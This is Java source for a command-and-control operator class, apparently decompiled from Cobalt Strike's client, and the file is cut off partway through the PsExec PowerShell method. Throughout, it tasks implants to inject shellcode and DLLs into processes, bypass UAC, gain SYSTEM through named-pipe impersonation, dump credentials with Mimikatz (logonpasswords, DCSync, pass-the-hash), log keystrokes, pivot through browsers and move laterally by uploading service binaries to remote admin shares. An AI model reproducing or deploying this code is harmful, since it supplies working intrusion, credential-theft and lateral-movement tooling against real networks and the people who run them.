package beacon;

import aggressor.AggressorClient;
import aggressor.DataManager;
import aggressor.DataUtils;
import aggressor.GlobalDataManager;
import beacon.jobs.*;
import common.*;
import kerberos.KerberosUtils;
import pe.PEParser;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.util.Arrays;
import java.util.HashSet;
import java.util.LinkedList;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.stream.Collectors;

public class TaskBeacon {
    protected GlobalDataManager gdata = GlobalDataManager.getGlobalDataManager();
    protected String[] bids;
    protected TeamQueue conn;
    protected EncodedCommandBuilder builder;
    protected DataManager data;
    protected AggressorClient client;
    protected boolean silent = false;
    private static Pattern funcp = null;

    public AggressorClient getClient() {
        return this.client;
    }

    public void silent() {
        this.silent = true;
    }

    public TaskBeacon(AggressorClient client, String[] bids) {
        this(client, client.getData(), client.getConnection(), bids);
    }

    public TaskBeacon(AggressorClient client, DataManager data, TeamQueue conn, String[] bids) {
        this.client = client;
        this.bids = bids;
        this.conn = conn;
        this.data = data;
        this.builder = new EncodedCommandBuilder(client);
    }

    public void task(byte[] taskA, byte[] taskB, String description) {
        this.task(taskA, taskB, description, "");
    }

    public void task(byte[] taskA, byte[] taskB, String description, String tactic) {
        for (String bid : this.bids) {
            this.log_task(bid, description, tactic);
            this.conn.call("beacons.task", CommonUtils.args(bid, taskA));
            this.conn.call("beacons.task", CommonUtils.args(bid, taskB));
        }
    }

    public void log_task(String bid, String description) {
        this.log_task(bid, description, "");
    }

    public void log_task(String bid, String description, String tactic) {
        if (this.silent) {
            return;
        }
        this.conn.call("beacons.log_write", CommonUtils.args(BeaconOutput.Task(bid, description, tactic)));
    }

    public void input(String text) {
        for (String bid : this.bids) {
            this.conn.call("beacons.log_write", CommonUtils.args(BeaconOutput.Input(bid, text)));
        }
    }

    public void log(String text) {
        for (String bid : this.bids) {
            this.conn.call("beacons.log_write", CommonUtils.args(BeaconOutput.Output(bid, text)));
        }
    }

    public void log2(String text) {
        for (String bid : this.bids) {
            this.conn.call("beacons.log_write", CommonUtils.args(BeaconOutput.OutputB(bid, text)));
        }
    }

    public void error(String text) {
        for (String bid : this.bids) {
            this.error(bid, text);
        }
    }

    public void error(String bid, String text) {
        this.conn.call("beacons.log_write", CommonUtils.args(BeaconOutput.Error(bid, text)));
    }

    public void task(String text) {
        this.task(text, "");
    }

    public void task(String text, String tactic) {
        for (String bid : this.bids) {
            this.log_task(bid, text, tactic);
        }
    }

    public void task(String bid, byte[] taskA, String description) {
        this.task(bid, taskA, description, "");
    }

    public void task(String bid, byte[] taskA, byte[] taskB, String description) {
        this.task(bid, taskA, taskB, description, "");
    }

    public void task(String bid, byte[] taskA, String description, String tactic) {
        this.log_task(bid, description, tactic);
        this.conn.call("beacons.task", CommonUtils.args(bid, taskA));
    }

    public void task(String bid, byte[] taskA, byte[] taskB, String description, String tactic) {
        this.log_task(bid, description, tactic);
        this.conn.call("beacons.task", CommonUtils.args(bid, taskA));
        this.conn.call("beacons.task", CommonUtils.args(bid, taskB));
    }

    protected void taskNoArgs(int command, String text) {
        this.taskNoArgs(command, text, "");
    }

    protected void taskNoArgs(int command, String text, String tactic) {
        this.builder.setCommand(command);
        byte[] task = this.builder.build();
        for (String bid : this.bids) {
            this.log_task(bid, text, tactic);
            this.conn.call("beacons.task", CommonUtils.args(bid, task));
        }
    }

    protected void taskNoArgsCallback(int command, String text) {
        this.taskNoArgsCallback(command, text, "");
    }

    protected void taskNoArgsCallback(int command, String text, String tactic) {
        this.builder.setCommand(command);
        this.builder.addInteger(0);
        byte[] task = this.builder.build();
        for (String bid : this.bids) {
            this.log_task(bid, text, tactic);
            this.conn.call("beacons.task", CommonUtils.args(bid, task));
        }
    }

    protected void taskOneArg(int command, String arg, String text) {
        this.taskOneArg(command, arg, text, "");
    }

    protected void taskOneArg(int command, String arg, String text, String tactic) {
        this.builder.setCommand(command);
        this.builder.addString(arg);
        byte[] task = this.builder.build();
        for (String bid : this.bids) {
            this.log_task(bid, text, tactic);
            this.conn.call("beacons.task", CommonUtils.args(bid, task));
        }
    }

    protected void taskOneEncodedArg(int command, String arg, String text, String tactic) {
        for (String bid : this.bids) {
            this.builder.setCommand(command);
            this.builder.addEncodedString(bid, arg);
            byte[] task = this.builder.build();
            this.log_task(bid, text, tactic);
            this.conn.call("beacons.task", CommonUtils.args(bid, task));
        }
    }

    protected void taskOneArgI(int command, int arg, String text) {
        this.taskOneArgI(command, arg, text, "");
    }

    protected void taskOneArgI(int command, int arg, String text, String tactic) {
        this.builder.setCommand(command);
        this.builder.addInteger(arg);
        byte[] task = this.builder.build();
        for (String bid : this.bids) {
            this.log_task(bid, text, tactic);
            this.conn.call("beacons.task", CommonUtils.args(bid, task));
        }
    }

    protected void taskOneArgS(int command, int arg, String text) {
        this.taskOneArgS(command, arg, text, "");
    }

    protected void taskOneArgS(int command, int arg, String text, String tactic) {
        this.builder.setCommand(command);
        this.builder.addShort(arg);
        byte[] task = this.builder.build();
        for (String bid : this.bids) {
            this.log_task(bid, text, tactic);
            this.conn.call("beacons.task", CommonUtils.args(bid, task));
        }
    }

    public String cmd_sanity(String command, String desc) {
        if (command.length() > 8191) {
            CommonUtils.print_error(desc + " command is " + command.length() + " bytes. This exceeds the 8191 byte command-line string limitation in Windows. This action will fail. Likely, your Resource Kit script is generating a script that is too large. Optimize your templates for size.");
        }
        return command;
    }

    public void BrowserPivot(int pid, String arch) {
        for (String bid : this.bids) {
            this.BrowserPivot(bid, pid, arch, CommonUtils.randomPort());
        }
    }

    public void BrowserPivot(String bid, int pid, String arch, int bport) {
        int myport = CommonUtils.randomPort();
        byte[] proxysrv = BrowserPivot.exportServer(myport, arch.equals("x64"));
        if (arch.equals("x64")) {
            proxysrv = ReflectiveDLL.patchDOSHeaderX64(proxysrv);
            this.builder.setCommand(43);
        } else {
            proxysrv = ReflectiveDLL.patchDOSHeader(proxysrv);
            this.builder.setCommand(9);
        }
        this.builder.addInteger(pid);
        this.builder.addInteger(0);
        this.builder.addString(CommonUtils.bString(proxysrv));
        this.builder.pad(proxysrv.length, 1024);
        byte[] task = this.builder.build();
        this.log_task(bid, "Injecting browser pivot DLL into " + pid, "T1111, T1055, T1185");
        this.conn.call("beacons.task", CommonUtils.args(bid, task));
        this.conn.call("browserpivot.start", CommonUtils.args(bid, bport + "", myport + ""));
        this.GoInteractive(bid);
        this.conn.call("beacons.portfwd", CommonUtils.args(bid, "127.0.0.1", myport));
    }

    public void BrowserPivotStop() {
        for (String bid : this.bids) {
            this.conn.call("browserpivot.stop", CommonUtils.args(bid));
        }
    }

    public void BypassUAC(String listener) {
        for (String bid : this.bids) {
            this._BypassUAC(bid, listener);
        }
        this.handleBindStager(listener);
    }

    protected void _BypassUAC(String bid, String listener) {
        String name = CommonUtils.garbage("elev") + ".dll";
        byte[] stager = DataUtils.shellcode(this.gdata, listener);
        BeaconEntry entry = DataUtils.getBeacon(this.data, bid);
        if (entry == null) {
            this.conn.call("beacons.log_write", CommonUtils.args(BeaconOutput.Error(bid, "Please wait until Beacon checks in next [could not find metadata]")));
            return;
        }
        byte[] myartifact;
        myartifact = entry.is64() ? (entry.getVersion() >= 6.2 ? new ArtifactUtils(this.client).patchArtifact(stager, "artifactuac64alt.dll") : new ArtifactUtils(this.client).patchArtifact(stager, "artifactuac64.dll")) : (entry.getVersion() >= 6.2 ? new ArtifactUtils(this.client).patchArtifact(stager, "artifactuac32alt.dll") : new ArtifactUtils(this.client).patchArtifact(stager, "artifactuac32.dll"));
        if (myartifact.length >= 24576) {
            this.conn.call("beacons.log_write", CommonUtils.args(BeaconOutput.Error(bid, "UAC artifact template (" + myartifact.length + " bytes) exceeds the 24576 byte max. Make your UAC artifacts smaller.")));
            return;
        }
        new BypassUACJob(this, name, listener, myartifact).spawn(bid, entry.is64() ? "x64" : "x86");
        this.conn.call("beacons.log_write", CommonUtils.args(BeaconOutput.FileIndicator(bid, name, myartifact)));
    }

    public void BypassUACToken(String listener) {
        byte[] stager = DataUtils.shellcode(this.gdata, listener);
        byte[] script = new ResourceUtils(this.client).buildPowerShell(stager);
        int port = CommonUtils.randomPort();
        String runme = new PowerShellUtils(this.client).format(new PowerShellUtils(this.client).PowerShellDownloadCradle("http://127.0.0.1:" + port + "/"), false);
        this.builder.setCommand(59);
        this.builder.addShort(port);
        this.builder.addString(script);
        byte[] setuptask = this.builder.build();
        for (String bid : this.bids) {
            this.conn.call("beacons.task", CommonUtils.args(bid, setuptask));
        }
        this.ExecuteHighIntegrity(runme, "Tasked beacon to spawn " + Listener.getListener(listener) + " in a high integrity process (token duplication)");
        this.handleBindStager(listener);
    }

    public void Checkin() {
        this.taskNoArgs(8, "Tasked beacon to checkin");
    }

    public void Cancel(String file) {
        for (String bid : this.bids) {
            this.log_task(bid, "Tasked " + CommonUtils.session(bid) + " to cancel downloads that match " + file);
            this.conn.call("beacons.download_cancel", CommonUtils.args(bid, file));
        }
    }

    public void Cd(String dir) {
        this.taskOneEncodedArg(5, dir, "cd " + dir, "");
    }

    public void Clear() {
        for (String bid : this.bids) {
            this.log_task(bid, "Cleared " + CommonUtils.session(bid) + " queue");
            this.conn.call("beacons.clear", CommonUtils.args(bid));
        }
    }

    public String file_to_tactic(String file) {
        if ((file = file.toLowerCase()).startsWith("\\\\") && (CommonUtils.isin("\\C$", file) || CommonUtils.isin("\\ADMIN$", file))) {
            return "T1077";
        }
        return "";
    }

    public void Copy(String src, String dst) {
        for (String bid : this.bids) {
            this.builder.setCommand(73);
            this.builder.addLengthAndEncodedString(bid, src);
            this.builder.addLengthAndEncodedString(bid, dst);
            byte[] task = this.builder.build();
            this.log_task(bid, "Tasked beacon to copy " + src + " to " + dst, this.file_to_tactic(dst));
            this.conn.call("beacons.task", CommonUtils.args(bid, task));
        }
    }

    public void CovertVPN(String bid, String intf, String tgip, String hwaddr) {
        HashSet chain;
        byte[] client;
        String myip;
        BeaconEntry entry = DataUtils.getBeacon(this.data, bid);
        if (entry != null && entry.getVersion() >= 10.0) {
            this.error("CovertVPN is not compatible with Windows 10");
            return;
        }
        Map meta = DataUtils.getInterface(this.data, intf);
        if (meta.size() == 0) {
            this.error("No interface " + intf);
            return;
        }
        if (hwaddr != null) {
            this.conn.call("cloudstrike.set_tap_hwaddr", CommonUtils.args(intf, hwaddr));
        }
        if ((client = VPNClient.exportClient(myip = DataUtils.getLocalIP(this.data), tgip, meta, chain = new HashSet(DataUtils.getBeaconChain(this.data, bid)))).length == 0) {
            return;
        }
        client = ReflectiveDLL.patchDOSHeader(client);
        if ("TCP (Bind)".equals(meta.get("channel"))) {
            this.GoInteractive(bid);
            this.conn.call("beacons.portfwd", CommonUtils.args(bid, "127.0.0.1", meta.get("port")));
        }
        this.taskOneArg(1, CommonUtils.bString(client), "Tasked beacon to deploy Covert VPN for " + intf, "T1093");
    }

    public void CovertVPN(String intf, String myip) {
        for (String bid : this.bids) {
            this.CovertVPN(bid, intf, myip, null);
        }
    }

    public void DcSync(String fqdn, String user) {
        this.MimikatzSmall("@lsadump::dcsync /domain:" + fqdn + " /user:" + user);
    }

    public void Desktop(boolean quality) {
        for (String bid : this.bids) {
            this.GoInteractive(bid);
            new DesktopJob(this).spawn(bid, quality);
        }
    }

    public void Desktop(int pid, String arch, boolean quality) {
        for (String bid : this.bids) {
            this.GoInteractive(bid);
            new DesktopJob(this).inject(bid, pid, arch, quality);
        }
    }

    public void Die() {
        this.builder.setCommand(3);
        byte[] task = this.builder.build();
        for (String bid : this.bids) {
            this.log_task(bid, "Tasked " + CommonUtils.session(bid) + " to exit");
            this.conn.call("beacons.task", CommonUtils.args(bid, task));
        }
    }

    public void DllInject(int pid, String file) {
        byte[] mydll = CommonUtils.readFile(file);
        int offset = ReflectiveDLL.findReflectiveLoader(mydll);
        if (offset <= 0) {
            this.error("Could not find reflective loader in " + file);
            return;
        }
        if (ReflectiveDLL.is64(mydll)) {
            this.builder.setCommand(43);
        } else {
            this.builder.setCommand(9);
        }
        this.builder.addInteger(pid);
        this.builder.addInteger(offset);
        this.builder.addString(CommonUtils.bString(mydll));
        byte[] task = this.builder.build();
        for (String bid : this.bids) {
            this.log_task(bid, "Tasked beacon to inject " + file + " into " + pid, "T1055");
            this.conn.call("beacons.task", CommonUtils.args(bid, task));
        }
    }

    public void DllLoad(int pid, String file) {
        this.builder.setCommand(80);
        this.builder.addInteger(pid);
        this.builder.addString(file + '\u0000');
        byte[] task = this.builder.build();
        for (String bid : this.bids) {
            this.log_task(bid, "Tasked beacon to load " + file + " into " + pid, "T1055");
            this.conn.call("beacons.task", CommonUtils.args(bid, task));
        }
    }

    public void DllSpawn(String file, String arg, String desc, int waittime) {
        DllSpawnJob job = new DllSpawnJob(this, file, arg, desc, waittime);
        for (String bid : this.bids) {
            job.spawn(bid);
        }
    }

    public void Download(String file) {
        if (this.bids.length > 0) {
            if (file.startsWith("\\\\")) {
                this.taskOneEncodedArg(11, file, "Tasked " + CommonUtils.session(this.bids[0]) + " to download " + file, "T1039");
            } else {
                this.taskOneEncodedArg(11, file, "Tasked " + CommonUtils.session(this.bids[0]) + " to download " + file, "T1005");
            }
        }
    }

    public void Drives() {
        for (String bid : this.bids) {
            this.log_task(bid, "Tasked beacon to list drives");
            this.conn.call("beacons.task_drives_default", CommonUtils.args(bid));
        }
    }

    public void Elevate(String _exploit, String listener) {
        BeaconExploits.Exploit exploit = DataUtils.getBeaconExploits(this.data).getExploit(_exploit);
        for (String bid : this.bids) {
            exploit.elevate(bid, listener);
        }
    }

    public void Execute(String command) {
        this.taskOneEncodedArg(12, command, "Tasked beacon to execute: " + command, "T1106");
    }

    public void ExecuteAssembly(String file, String args) {
        PEParser parser = PEParser.load(CommonUtils.readFile(file));
        if (!parser.isProcessAssembly()) {
            this.error("File " + file + " is not a process assembly (.NET EXE)");
            return;
        }
        for (String bid : this.bids) {
            BeaconEntry entry = DataUtils.getBeacon(this.data, bid);
            if (entry.is64()) {
                new ExecuteAssemblyJob(this, file, args, "x64").spawn(bid);
                continue;
            }
            new ExecuteAssemblyJob(this, file, args, "x86").spawn(bid);
        }
    }

    public void ExecuteHighIntegrity(String command, String desc) {
        for (String bid : this.bids) {
            BeaconEntry entry = DataUtils.getBeacon(this.data, bid);
            if (entry != null && entry.is64()) {
                new BypassUACTokenJob(this, command, desc, "x64").spawn(bid);
                continue;
            }
            new BypassUACTokenJob(this, command, desc, "x86").spawn(bid);
        }
    }

    public void GetPrivs() {
        this.GetPrivs("SeDebugPrivilege, SeTcbPrivilege, SeCreateTokenPrivilege, SeAssignPrimaryTokenPrivilege, SeLockMemoryPrivilege, SeIncreaseQuotaPrivilege, SeUnsolicitedInputPrivilege, SeMachineAccountPrivilege, SeSecurityPrivilege, SeTakeOwnershipPrivilege, SeLoadDriverPrivilege, SeSystemProfilePrivilege, SeSystemtimePrivilege, SeProfileSingleProcessPrivilege, SeIncreaseBasePriorityPrivilege, SeCreatePagefilePrivilege, SeCreatePermanentPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeShutdownPrivilege, SeAuditPrivilege, SeSystemEnvironmentPrivilege, SeChangeNotifyPrivilege, SeRemoteShutdownPrivilege, SeUndockPrivilege, SeSyncAgentPrivilege, SeEnableDelegationPrivilege, SeManageVolumePrivilege");
    }

    public void GetPrivs(String privs) {
        this.builder.setCommand(77);
        this.builder.addStringArray(CommonUtils.toArray(privs));
        byte[] task = this.builder.build();
        for (String bid : this.bids) {
            this.log_task(bid, "Tasked beacon to enable privileges", "T1134");
            this.conn.call("beacons.task", CommonUtils.args(bid, task));
        }
    }

    public void GetSystem() {
        String service = CommonUtils.pick("ms, srv, upd, kb, nt, t") + CommonUtils.toHex(CommonUtils.rand(999999));
        String pipe = "\\\\.\\pipe\\" + CommonUtils.garbage("system");
        String data = CommonUtils.garbage("random data");
        this.builder.setCommand(60);
        this.builder.addString(pipe);
        byte[] pre = this.builder.build();
        this.builder.setCommand(25);
        this.builder.addLengthAndString(service);
        this.builder.addLengthAndString("%COMSPEC% /c echo " + data + " > " + pipe);
        byte[] getsystem = this.builder.build();
        this.builder.setCommand(61);
        byte[] post = this.builder.build();
        for (String bid : this.bids) {
            this.log_task(bid, "Tasked beacon to get SYSTEM", "T1134, T1050");
            this.conn.call("beacons.log_write", CommonUtils.args(BeaconOutput.ServiceIndicator(bid, "127.0.0.1", service)));
            this.conn.call("beacons.task", CommonUtils.args(bid, pre));
            this.conn.call("beacons.task", CommonUtils.args(bid, getsystem));
            this.conn.call("beacons.task", CommonUtils.args(bid, post));
        }
    }

    public void GetUID() {
        this.taskNoArgs(27, "Tasked beacon to get userid");
    }

    public void Hashdump() {
        for (String bid : this.bids) {
            BeaconEntry entry = DataUtils.getBeacon(this.data, bid);
            if (entry.is64()) {
                new HashdumpJob(this).spawn(bid, "x64");
                continue;
            }
            new HashdumpJob(this).spawn(bid, "x86");
        }
    }

    public void Inject(int pid, String listener) {
        this.Inject(pid, listener, "x86");
    }

    public void Inject(int pid, String listener, String arch) {
        AssertUtils.TestPID(pid);
        AssertUtils.TestSetValue(arch, "x86, x64");
        byte[] stager = new byte[]{};
        if (arch.equals("x86")) {
            stager = DataUtils.shellcode(this.gdata, listener);
            this.builder.setCommand(9);
        } else if (arch.equals("x64")) {
            stager = DataUtils.shellcodeX64(this.gdata, listener);
            this.builder.setCommand(43);
        }
        if (stager.length == 0) {
            this.error("No " + arch + " stager for " + Listener.getListener(listener));
            return;
        }
        this.builder.addInteger(pid);
        this.builder.addInteger(0);
        this.builder.addString(CommonUtils.bString(stager));
        byte[] task = this.builder.build();
        for (String bid : this.bids) {
            this.log_task(bid, "Tasked beacon to inject " + Listener.getListener(listener) + " into " + pid + " (" + arch + ")", "T1055");
            this.conn.call("beacons.task", CommonUtils.args(bid, task));
        }
        this.handleBindStager(listener, arch);
    }

    public void JobKill(int jobid) {
        this.builder.setCommand(42);
        this.builder.addShort(jobid);
        byte[] task = this.builder.build();
        for (String bid : this.bids) {
            this.log_task(bid, "Tasked beacon to kill job " + jobid);
            this.conn.call("beacons.task", CommonUtils.args(bid, task));
        }
    }

    public void Jobs() {
        this.taskNoArgs(41, "Tasked beacon to list jobs");
    }

    public void KerberosTicketPurge() {
        this.taskNoArgs(35, "Tasked beacon to purge kerberos tickets", "T1097");
    }

    public void KerberosTicketUse(String file) {
        try {
            FileInputStream fin = new FileInputStream(file);
            byte[] data = CommonUtils.readAll(fin);
            fin.close();
            this.taskOneArg(34, CommonUtils.bString(data), "Tasked beacon to apply ticket in " + file, "T1097");
        } catch (IOException ioex) {
            MudgeSanity.logException("kerb ticket use: " + file, ioex, false);
        }
    }

    public void KerberosCCacheUse(String file) {
        byte[] data = KerberosUtils.ConvertCCacheToKrbCred(file);
        if (data.length == 0) {
            this.error("Could not extract ticket from " + file);
        } else {
            this.taskOneArg(34, CommonUtils.bString(data), "Tasked beacon to extract ticket from " + file, "T1097");
        }
    }

    public void KeyLogger() {
        for (String bid : this.bids) {
            BeaconEntry entry = DataUtils.getBeacon(this.data, bid);
            if (entry == null) continue;
            new KeyloggerJob(this).spawn(bid, entry.arch());
        }
    }

    public void KeyLogger(int pid, String arch) {
        new KeyloggerJob(this).inject(pid, arch);
    }

    public void Kill(int pid) {
        this.taskOneArgI(33, pid, "Tasked beacon to kill " + pid);
    }

    public void Link(String host) {
        this.taskOneArg(21, host, "Tasked to link to '" + host + "'", "T1090");
    }

    public void LoginUser(String domain, String user, String pass) {
        for (String bid : this.bids) {
            this.builder.setCommand(49);
            this.builder.addLengthAndEncodedString(bid, domain);
            this.builder.addLengthAndEncodedString(bid, user);
            this.builder.addLengthAndEncodedString(bid, pass);
            byte[] task = this.builder.build();
            this.log_task(bid, "Tasked beacon to create a token for " + domain + "\\" + user, "T1134");
            this.conn.call("beacons.task", CommonUtils.args(bid, task));
        }
    }

    public void LogonPasswords() {
        this.MimikatzSmall("sekurlsa::logonpasswords");
    }

    public void Ls(String folder) {
        for (String bid : this.bids) {
            if (folder.startsWith("\\\\") && folder.endsWith("$")) {
                this.log_task(bid, "Tasked beacon to list files in " + folder, "T1077");
            } else {
                this.log_task(bid, "Tasked beacon to list files in " + folder);
            }
            String folder_encoded = CommonUtils.bString(DataUtils.encodeForBeacon(this.data, bid, folder));
            this.conn.call("beacons.task_ls_default", CommonUtils.args(bid, folder_encoded));
        }
    }

    public void Message(String message) {
    }

    public void Mimikatz(String command) {
        for (String bid : this.bids) {
            BeaconEntry entry = DataUtils.getBeacon(this.data, bid);
            if (entry.is64()) {
                new MimikatzJob(this, command).spawn(bid, "x64");
                continue;
            }
            new MimikatzJob(this, command).spawn(bid, "x86");
        }
    }

    public void MimikatzSmall(String command) {
        for (String bid : this.bids) {
            BeaconEntry entry = DataUtils.getBeacon(this.data, bid);
            if (entry.is64()) {
                new MimikatzJobSmall(this, command).spawn(bid, "x64");
                continue;
            }
            new MimikatzJobSmall(this, command).spawn(bid, "x86");
        }
    }

    public void MkDir(String folder) {
        this.taskOneEncodedArg(54, folder, "Tasked beacon to make directory " + folder, "");
    }

    protected void mode(String mode, String message) {
        for (String bid : this.bids) {
            this.conn.call("beacons.log_write", CommonUtils.args(BeaconOutput.Mode(bid, message)));
            this.conn.call("beacons.mode", CommonUtils.args(bid, mode));
        }
    }

    public void ModeDNS() {
        this.mode("dns", "data channel set to DNS");
    }

    public void ModeDNS6() {
        this.mode("dns6", "data channel set to DNS6");
    }

    public void ModeDNS_TXT() {
        this.mode("dns-txt", "data channel set to DNS-TXT");
    }

    public void ModeHTTP() {
        this.mode("http", "data channel set to HTTP");
    }

    public void ModeSMB() {
        this.builder.setCommand(20);
        byte[] task = this.builder.build();
        for (String bid : this.bids) {
            this.conn.call("beacons.log_write", CommonUtils.args(BeaconOutput.Mode(bid, "I will wait for a link from another beacon")));
            this.conn.call("beacons.task", CommonUtils.args(bid, task));
        }
    }

    public void Move(String src, String dst) {
        for (String bid : this.bids) {
            this.builder.setCommand(74);
            this.builder.addLengthAndEncodedString(bid, src);
            this.builder.addLengthAndEncodedString(bid, dst);
            byte[] task = this.builder.build();
            this.log_task(bid, "Tasked beacon to move " + src + " to " + dst, this.file_to_tactic(dst));
            this.conn.call("beacons.task", CommonUtils.args(bid, task));
        }
    }

    public void NetView(String command, String target, String param) {
        for (String bid : this.bids) {
            new NetViewJob(this, command, target, param).spawn(bid, "x86");
        }
    }

    public void Note(String note) {
        for (String bid : this.bids) {
            this.conn.call("beacons.note", CommonUtils.args(bid, note));
        }
    }

    public void PassTheHash(String domain, String user, String hash2) {
        String pipe = "\\\\.\\pipe\\" + CommonUtils.garbage("system");
        String data = CommonUtils.garbage("random data");
        String cmd = "%COMSPEC% /c echo " + data + " > " + pipe;
        this.builder.setCommand(60);
        this.builder.addString(pipe);
        byte[] pre = this.builder.build();
        for (String bid1 : this.bids) {
            this.conn.call("beacons.task", CommonUtils.args(bid1, pre));
        }
        this.MimikatzSmall("sekurlsa::pth /user:" + user + " /domain:" + domain + " /ntlm:" + hash2 + " /run:\"" + cmd + "\"");
        this.builder.setCommand(61);
        byte[] post = this.builder.build();
        for (String bid : this.bids) {
            this.conn.call("beacons.task", CommonUtils.args(bid, post));
        }
    }

    public void Pause(int time) {
        this.builder.setCommand(47);
        this.builder.addInteger(time);
        byte[] task = this.builder.build();
        for (String bid : this.bids) {
            this.conn.call("beacons.task", CommonUtils.args(bid, task));
        }
    }

    public void PortScan(String targets, String ports, String discovery, int maxsockets) {
        for (String bid : this.bids) {
            new PortScannerJob(this, targets, ports, discovery, maxsockets).spawn(bid, "x86");
        }
    }

    public void PortForward(int bport, String fhost, int fport) {
        this.builder.setCommand(50);
        this.builder.addShort(bport);
        byte[] task = this.builder.build();
        for (String bid : this.bids) {
            this.conn.call("beacons.rportfwd", CommonUtils.args(bid, bport, fhost, fport));
            this.log_task(bid, "Tasked " + CommonUtils.session(bid) + " to forward port " + bport + " to " + fhost + ":" + fport, "T1090");
            this.conn.call("beacons.task", CommonUtils.args(bid, task));
        }
    }

    public void PortForwardStop(int bport) {
        this.builder.setCommand(51);
        this.builder.addShort(bport);
        byte[] task = this.builder.build();
        for (String bid : this.bids) {
            this.log_task(bid, "Tasked " + CommonUtils.session(bid) + " to stop port forward on " + bport);
            this.conn.call("beacons.task", CommonUtils.args(bid, task));
            this.client.getConnection().call("beacons.pivot_stop_port", CommonUtils.args(bport + ""));
        }
    }

    public void PowerShell(String command) {
        for (String bid : this.bids) {
            this.PowerShell(bid, command);
        }
    }

    public void PowerShell(String bid, String command) {
        PowerShellTasks ptasks = new PowerShellTasks(this.client, bid);
        this.log_task(bid, "Tasked beacon to run: " + command, "T1086");
        String cradle = ptasks.getImportCradle();
        ptasks.runCommand(cradle + command);
    }

    public void PowerShellUnmanaged(String command) {
        for (String bid : this.bids) {
            BeaconEntry entry = DataUtils.getBeacon(this.data, bid);
            String cradle = new PowerShellTasks(this.client, bid).getImportCradle();
            if (entry.is64()) {
                new PowerShellJob(this, cradle, command).spawn(bid, "x64");
                continue;
            }
            new PowerShellJob(this, cradle, command).spawn(bid, "x86");
        }
    }

    public void SecureShell(String user, String pass, String target, int port) {
        for (String bid : this.bids) {
            this.log_task(bid, "Tasked beacon to SSH to " + target + ":" + port + " as " + user, "T1021, T1093");
            this.conn.call("beacons.task_ssh_login", CommonUtils.args(bid, user, pass, target, port));
        }
    }

    public void SecureShellPubKey(String user, byte[] key_data, String target, int port) {
        for (String bid : this.bids) {
            this.log_task(bid, "Tasked beacon to SSH to " + target + ":" + port + " as " + user + " (key auth)", "T1021, T1093");
            this.conn.call("beacons.task_ssh_login_pubkey", CommonUtils.args(bid, user, CommonUtils.bString(key_data), target, port));
        }
    }

    protected LinkedList<String> _extractFunctions(String data) {
        LinkedList<String> results;
        if (funcp == null) {
            try {
                funcp = Pattern.compile("\\s*[fF]unction ([a-zA-Z0-9-]*).*?", 0);
            } catch (Exception ex) {
                MudgeSanity.logException("compile pattern to extract posh funcs", ex, false);
            }
        }
        String[] lines = data.split("\n");
        results = Arrays.stream(lines).map(line -> funcp.matcher(line.trim())).filter(Matcher::matches).map(m -> m.group(1)).collect(Collectors.toCollection(LinkedList::new));
        return results;
    }

    public void PowerShellImport(String file) {
        try {
            LinkedList<String> cmdlets;
            String dataz;
            FileInputStream fin = new FileInputStream(file);
            byte[] data = CommonUtils.readAll(fin);
            fin.close();
            if (data.length == 0) {
                cmdlets = new LinkedList<>();
                dataz = "";
            } else {
                cmdlets = this._extractFunctions(CommonUtils.bString(data));
                cmdlets.add("");
                dataz = new PowerShellUtils(this.client).PowerShellCompress(data);
            }
            if ((long) dataz.length() > Tasks.max()) {
                this.error("max powershell import size is 1MB. Compressed script is: " + dataz.length() + " bytes");
                return;
            }
            for (String bid : this.bids) {
                DataUtils.reportPowerShellImport(this.client.getData(), bid, cmdlets);
                this.conn.call("beacons.report_posh", CommonUtils.args(bid, cmdlets));
            }
            this.taskOneArg(37, dataz, "Tasked beacon to import: " + file, "T1086, T1064");
        } catch (IOException iex) {
            MudgeSanity.logException("PowerShellImport: " + file, iex, false);
        }
    }

    public void PPID(int pid) {
        if (pid == 0) {
            this.taskOneArgI(75, pid, "Tasked beacon to use itself as parent process", "T1059, T1093, T1106");
        } else {
            this.taskOneArgI(75, pid, "Tasked beacon to spoof " + pid + " as parent process", "T1059, T1093, T1106");
        }
    }

    public void Ps() {
        this.taskNoArgsCallback(32, "Tasked beacon to list processes", "T1057");
    }

    public void PsExec(String target, String listener, String share) {
        for (String bid : this.bids) {
            this.PsExec(bid, target, listener, share);
        }
    }

    public void PsExec(String bid, String target, String listener, String share) {
        byte[] stager = DataUtils.shellcode(this.gdata, listener, true);
        byte[] myartifact = new ArtifactUtils(this.client).patchArtifact(stager, "artifact32svc.exe");
        String name = CommonUtils.garbage("service") + ".exe";
        String ldst = "\\\\127.0.0.1\\" + share + "\\" + name;
        String rdst = "\\\\" + target + "\\" + share + "\\" + name;
        this.builder.setCommand(10);
        this.builder.addLengthAndEncodedString(bid, rdst);
        this.builder.addString(CommonUtils.bString(myartifact));
        byte[] upload = this.builder.build();
        String sname = CommonUtils.garbage("service");
        this.builder.setCommand(58);
        this.builder.addLengthAndEncodedString(bid, target);
        this.builder.addLengthAndString(sname);
        this.builder.addLengthAndString(ldst);
        byte[] task = this.builder.build();
        this.builder.setCommand(56);
        this.builder.addEncodedString(bid, rdst);
        byte[] remove = this.builder.build();
        if (share.endsWith("$")) {
            this.log_task(bid, "Tasked beacon to run " + Listener.getListener(listener).toString(target) + " on " + target + " via Service Control Manager (" + rdst + ")", "T1035, T1050, T1077");
        } else {
            this.log_task(bid, "Tasked beacon to run " + Listener.getListener(listener).toString(target) + " on " + target + " via Service Control Manager (" + rdst + ")", "T1035, T1050");
        }
        this.conn.call("beacons.log_write", CommonUtils.args(BeaconOutput.ServiceIndicator(bid, target, sname)));
        this.conn.call("beacons.log_write", CommonUtils.args(BeaconOutput.FileIndicator(bid, rdst, myartifact)));
        this.conn.call("beacons.task", CommonUtils.args(bid, upload));
        this.conn.call("beacons.task", CommonUtils.args(bid, task));
        this.conn.call("beacons.task", CommonUtils.args(bid, remove));
        this.handlePipeStager(target, listener);
    }

    public void PsExecPSH(String target, String listener) {
        for (String bid : this.bids) {
            this.PsExecPSH(bid, target, listener);
        }
    }

    public void PsExecPSH(String bid, String target, String listener) {
        byte[] stager = DataUtils.shellcode(this.gdata, listener, true);
        String sname = CommonUtils.garbage("service");
        this.builder.setCommand(58);
        this.builder.addLengthAndEncodedString(bid, target);
        this.builder.addLengthAndString(sname);
        this.builder.addLengthAndString(this.cmd_sanity("%COMSPEC% /b /c start /b /min " + CommonUtils.bString(new PowerShellUtils(this.client).buildPowerShellCommand(stager)), "psexec_psh"));
